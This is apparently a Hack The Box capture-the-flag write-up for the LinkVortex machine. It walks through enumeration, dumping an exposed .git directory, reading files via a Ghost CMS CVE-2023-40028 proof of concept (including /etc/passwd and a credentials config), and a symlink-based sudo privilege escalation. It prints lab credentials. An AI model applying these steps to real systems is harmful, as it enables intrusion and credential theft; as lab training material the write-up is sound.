# LinkVortex Write-up

<img src="https://labs.hackthebox.com/storage/avatars/97f12db8fafed028448e29e30be7efac.png" width="200" height="200">

## Recon 

### Port enumeration with NMap

`nmap -sC -sV 10.10.11.47`

    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA)
    |_  256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519)
    80/tcp open  http    Apache httpd
    |_http-server-header: Apache
    |_http-title: Did not follow redirect to http://linkvortex.htb/
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Add domain name to `/etc/hosts`

    sudo echo "10.10.11.47 linkvortex.htb" | sudo tee -a /etc/hosts

Main page 

![image](https://github.com/user-attachments/assets/8d7b2112-786e-415a-9e20-4b45ad71107a)

### Directory enumeration with Dirsearch

`python3 dirsearch.py -u http://linkvortex.htb`

      _|. _ _  _  _  _ _|_    v0.4.3                                                        
     (_||| _) (/_(_|| (_| )                                                                 
                                                                                            
    Target: http://linkvortex.htb/
    
    [13:17:08] Scanning:                                                                    
    [13:18:20] 301 -   179B - /assets  ->  /assets/                             
    [13:18:24] 301 -     0B - /axis2-web//HappyAxis.jsp  ->  /axis2-web/HappyAxis.jsp/
    [13:18:28] 301 -     0B - /axis//happyaxis.jsp  ->  /axis/happyaxis.jsp/    
    [13:18:28] 301 -     0B - /axis2//axis2-web/HappyAxis.jsp  ->  /axis2/axis2-web/HappyAxis.jsp/
    [13:18:38] 301 -     0B - /Citrix//AccessPlatform/auth/clientscripts/cookies.js  ->  /Citrix/AccessPlatform/auth/clientscripts/cookies.js/
    [13:18:48] 301 -     0B - /engine/classes/swfupload//swfupload.swf  ->  /engine/classes/swfupload/swfupload.swf/
    [13:18:48] 301 -     0B - /engine/classes/swfupload//swfupload_f9.swf  ->  /engine/classes/swfupload/swfupload_f9.swf/
    [13:18:50] 301 -     0B - /extjs/resources//charts.swf  ->  /extjs/resources/charts.swf/
    [13:18:50] 200 -   15KB - /favicon.ico                                      
    [13:18:55] 301 -     0B - /html/js/misc/swfupload//swfupload.swf  ->  /html/js/misc/swfupload/swfupload.swf/
    [13:19:03] 200 -    1KB - /LICENSE                                          
    [13:21:07] 200 -   121B - /robots.txt                                        
    [13:22:03] 200 -   527B - /sitemap.xml                                       

`/robots.txt`

![image](https://github.com/user-attachments/assets/0020976b-e733-4743-8ede-5e170b74f309)

`/ghost/`

![image](https://github.com/user-attachments/assets/0bd133c8-5ae1-4c5d-ba86-4da790dab444)


### Sub-Domain enumeration 

Using Ffuf 

    ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://FUZZ.linkvortex.htb -H "Host: FUZZ.linkvortex.htb" -mc 200

Find `dev` subdomain, so add to `/etc/hosts` and open!

    sudo echo "10.10.11.47 dev.linkvortex.htb" | sudo tee -a /etc/hosts

![image](https://github.com/user-attachments/assets/14c6ca4d-0ac6-4bcd-8a89-efe73e401c4b)

### Directory enumeration

Enumerate the directories for dev.linkvortex.htb

`python3 dirsearch.py -u http://dev.linkvortex.htb`

          _|. _ _  _  _  _ _|_    v0.4.3
         (_||| _) (/_(_|| (_| )
        
        Scanning: 
        301 -   239B - /.git  ->  http://dev.linkvortex.htb/.git/        
        200 -   201B - /.git/config                                      
        200 -    73B - /.git/description
        200 -    41B - /.git/HEAD                                        
        200 -   874B - /.git/info/                                       
        200 -   240B - /.git/info/exclude
        200 -   868B - /.git/logs/                                       
        200 -   175B - /.git/logs/HEAD
        200 -   147B - /.git/packed-refs                                 
        200 -   869B - /.git/refs/
        301 -   249B - /.git/refs/tags  ->  http://dev.linkvortex.htb/.git/refs/tags/
        200 -    3KB - /.git/                                            
        200 -    1KB - /.git/objects/                                    
        200 -    3KB - /.git/hooks/                                      
        200 -  691KB - /.git/index                                       
        403 -   199B - /cgi-bin/                                         
        200 -    2KB - /index.html                                       
        403 -   199B - /server-status                                    
        403 -   199B - /server-status/

We can find `/.git/` let's use GitHack

### GitHack

    python3 GitHack.py -u "http://dev.linkvortex.htb/.git/"

![image](https://github.com/user-attachments/assets/8ef7be29-cc87-4f12-be1e-812197554f84)

    cat dev.linkvortex.htb/ghost/core/test/regression/api/admin/authentication.test.js

![image](https://github.com/user-attachments/assets/392bec70-cd33-491b-84e9-3c28fc588b03)

Password:

    OctopiFociPilfer45

Open page linkvortex.htb/ghost/#/signin and try to login like `admin`

`admin@linkvortex.htb`:`OctopiFociPilfer45`

![image](https://github.com/user-attachments/assets/cf968a12-5b5e-4aff-8c24-20bc9a718fff)

![image](https://github.com/user-attachments/assets/12f1bff5-e807-4c1c-a129-d82507bf27bb)

We now know the version of the CMS `GHost`. 

It is `v5.58.0`, we can find this out using `Wappalyzer` or by reading `/.git/config`. 

![image](https://github.com/user-attachments/assets/11fc0e3c-fb2c-4e29-94f5-b45096abe554)

## Exploitation 

### CVE-2023-40028

CVE-2023-40028 is a vulnerability in Ghost CMS that allows arbitrary file reads through improper file handling. 

Find and clone the open POC for CVE-2023-40028.

    git clone https://github.com/0xyassine/CVE-2023-40028

Change `GHOST_URL` IP to our host!

    GHOST_URL='http://linkvortex.htb'

![image](https://github.com/user-attachments/assets/d37ecaa3-f736-437f-8b35-af95ec74a57d)

Run script

    ./CVE-2023-40028.sh -u admin@linkvortex.htb -p OctopiFociPilfer45

And enter file name || path.

file> `/etc/passwd`

![image](https://github.com/user-attachments/assets/5439acf3-9f21-403f-8999-ce44c2a815dc)

If you remember we have a Dockerfile from GitHack, let's go through it.

![image](https://github.com/user-attachments/assets/7b18733b-1a23-4a25-a5c1-b8231b7f7545)

    var/lib/ghost/config.production.json

![image](https://github.com/user-attachments/assets/4cfac89a-a9ff-4194-b6ef-b53a0a2d5f6d)

Credentials `bob@linkvortex.htb`:`fibber-talented-worth`

    ssh bob@linkvortex.htb

![image](https://github.com/user-attachments/assets/b6e4fd1a-a7a8-4d10-896a-a246d6186afc)

### Get the user flag!

![image](https://github.com/user-attachments/assets/830f92a3-f1b1-4840-9368-8a7f568046df)

## Privilege Escalation

    sudo -l

![image](https://github.com/user-attachments/assets/51b37afb-2b3b-4723-92e9-b486756dc25a)

    cat /opt/ghost/clean_symlink.sh 

![image](https://github.com/user-attachments/assets/caeda757-c65d-4cf1-906d-ef0b40313c73)

    ln -s /root/root.txt text.txt
    ln -s /home/bob/text.txt image.png
    sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh /home/bob/image.png

### Get the root flag!

![image](https://github.com/user-attachments/assets/351d6592-b4d0-4c94-9d32-a22d21b6b6e2)
